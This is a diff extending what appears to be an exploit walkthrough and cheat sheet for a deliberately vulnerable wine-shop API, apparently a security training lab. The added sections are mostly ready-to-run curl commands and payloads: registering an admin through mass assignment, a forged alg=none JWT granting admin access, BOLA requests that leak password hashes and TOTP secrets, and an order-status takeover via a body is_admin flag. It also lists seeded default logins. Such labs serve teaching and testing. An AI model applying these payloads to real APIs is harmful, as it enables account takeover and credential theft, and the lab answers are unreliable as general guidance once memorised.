@@ -4,8 +4,9 @@
 ============================================================
 
 Default credentials:
-  joe@example.com  / password123  (user id: 1, has 2 pre-seeded orders: #1, #2)
-  jane@example.com / password123  (user id: 2, has 3 pre-seeded orders: #3, #4, #5)
+  joe@example.com   / password123  (user id: 1, has 2 pre-seeded orders: #1, #2)
+  jane@example.com  / password123  (user id: 2, has 3 pre-seeded orders: #3, #4, #5)
+  admin@example.com / password123  (user id: 3, admin role, access to /admin)
 
 Frontend: https://taintedport.com
 API:      https://api.taintedport.com
@@ -407,6 +408,137 @@ How it works:
   free, >100 means negative total (credit).
 
 
+------------------------------------------------------------
+16. PRIVILEGE ESCALATION VIA MASS ASSIGNMENT ON REGISTRATION
+------------------------------------------------------------
+
+Register a new admin account:
+
+  curl -X POST https://api.taintedport.com/auth/register \
+    -H "Content-Type: application/json" \
+    -d '{
+      "name": "Evil Admin",
+      "email": "evil@attacker.com",
+      "password": "password123",
+      "is_admin": 1
+    }'
+
+Expected response:
+  {"success":true,"message":"User registered successfully","token":"...","user":{"id":4,"name":"Evil Admin","email":"evil@attacker.com","is_admin":true}}
+
+The is_admin field in the request body is passed directly to the database.
+The new account has full admin access to /admin and all admin API endpoints.
+
+
+------------------------------------------------------------
+17. PRIVILEGE ESCALATION VIA JWT CLAIM FORGERY (CHAIN)
+------------------------------------------------------------
+
+This is a multi-step exploit that chains JWT vulnerabilities (#7/#8)
+with the JWT-claim-based admin check:
+
+Step 1 - Login as any regular user to get a valid JWT:
+
+  curl -X POST https://api.taintedport.com/auth/login \
+    -H "Content-Type: application/json" \
+    -d '{"email": "joe@example.com", "password": "password123"}'
+
+Step 2 - Decode the JWT payload (base64url), add is_admin:
+
+  Original payload: {"user_id":1,"email":"joe@example.com","is_admin":false,"iat":...,"exp":...}
+  Modified payload: {"user_id":1,"email":"joe@example.com","is_admin":true,"iat":1700000000,"exp":9999999999}
+
+Step 3 - Forge a token using the "none" algorithm:
+
+  Header:  {"alg":"none","typ":"JWT"}  -> base64url: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
+  Payload: {"user_id":1,"email":"joe@example.com","is_admin":true,"exp":9999999999}
+           -> base64url: eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImpvZUBleGFtcGxlLmNvbSIsImlzX2FkbWluIjp0cnVlLCJleHAiOjk5OTk5OTk5OTl9
+
+  Forged token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImpvZUBleGFtcGxlLmNvbSIsImlzX2FkbWluIjp0cnVlLCJleHAiOjk5OTk5OTk5OTl9.
+
+Step 4 - Use the forged token to access admin endpoints:
+
+  curl https://api.taintedport.com/admin/orders \
+    -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImpvZUBleGFtcGxlLmNvbSIsImlzX2FkbWluIjp0cnVlLCJleHAiOjk5OTk5OTk5OTl9."
+
+How it works:
+  The AdminController reads is_admin from the JWT payload rather than the
+  database. The JWT decode accepts tokens with alg=none (no signature
+  needed) and also doesn't verify signatures for HS256. An attacker can
+  modify the payload to include is_admin=true and gain full admin access.
+  This creates a vulnerability chain: JWT weakness -> privilege escalation.
+
+
+------------------------------------------------------------
+18. BOPLA - EXCESSIVE DATA EXPOSURE ON ORDER DETAILS
+------------------------------------------------------------
+
+Fetch any order (using the existing BOLA) and observe leaked user properties:
+
+  # Login as joe
+  TOKEN=$(curl -s -X POST https://api.taintedport.com/auth/login \
+    -H "Content-Type: application/json" \
+    -d '{"email":"joe@example.com","password":"password123"}' | \
+    python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
+
+  # Fetch Jane's order (BOLA) and observe leaked user data (BOPLA)
+  curl -s https://api.taintedport.com/orders/3 \
+    -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
+
+Expected response includes sensitive user properties:
+  {
+    "order": {
+      "id": 3,
+      "user_id": 2,
+      "owner_name": "Jane Doe",
+      "owner_email": "jane@example.com",
+      "owner_password_hash": "$2y$10$...",     <-- LEAKED
+      "owner_totp_secret": "JBSWY3DPEHPK...", <-- LEAKED (if 2FA enabled)
+      "owner_is_admin": 0,                     <-- LEAKED
+      "shipping_name": "Jane Doe",
+      ...
+    }
+  }
+
+How it works:
+  The Order model's getById() JOINs with the users table and includes
+  password_hash, totp_secret, and is_admin in the response. The frontend
+  ignores these fields, but they are fully visible in the API response.
+  Combined with BOLA (#11), an attacker can harvest credentials and 2FA
+  secrets for all users by enumerating order IDs.
+
+
+------------------------------------------------------------
+19. BFLA - ORDER STATUS UPDATE VIA REQUEST BODY ADMIN FLAG
+------------------------------------------------------------
+
+Change any order's status as a regular user by passing is_admin:true:
+
+  # Login as joe (regular user)
+  TOKEN=$(curl -s -X POST https://api.taintedport.com/auth/login \
+    -H "Content-Type: application/json" \
+    -d '{"email":"joe@example.com","password":"password123"}' | \
+    python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
+
+  # Change order #3 (Jane's order) status to "cancelled" - as a regular user
+  curl -X PUT https://api.taintedport.com/orders/3/status \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{"is_admin": true, "status": "cancelled"}'
+
+Expected response:
+  {"success":true,"message":"Order status updated to cancelled."}
+
+Without is_admin:true, you get:
+  {"success":false,"message":"Admin access required."}
+
+How it works:
+  The PUT /orders/:id/status endpoint checks if is_admin is truthy in
+  the request body instead of verifying the user's actual role. Any
+  authenticated user can perform admin-level order management by simply
+  including "is_admin": true in their JSON payload.
+
+
 ============================================================
   CHEAT SHEET - Quick Copy-Paste Payloads
 ============================================================
@@ -425,3 +557,7 @@ Mass assignment:         {"name": "HACKED", "user_id": 2}
 Price manipulation:      {"wine_id": 1, "quantity": 1, "price": 0.01}
 2FA disable IDOR:        {"password": "yourpass", "user_id": 2}
 Free order:              {"discount_code": "X", "discount_percent": 100}
+Priv esc (register):     {"name":"x","email":"x@x.com","password":"password123","is_admin":1}
+Priv esc (JWT forge):    eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImpvZUBleGFtcGxlLmNvbSIsImlzX2FkbWluIjp0cnVlLCJleHAiOjk5OTk5OTk5OTl9.
+BOPLA (order leak):      GET /orders/3 → owner_password_hash, owner_totp_secret
+BFLA (order status):     {"is_admin": true, "status": "cancelled"}
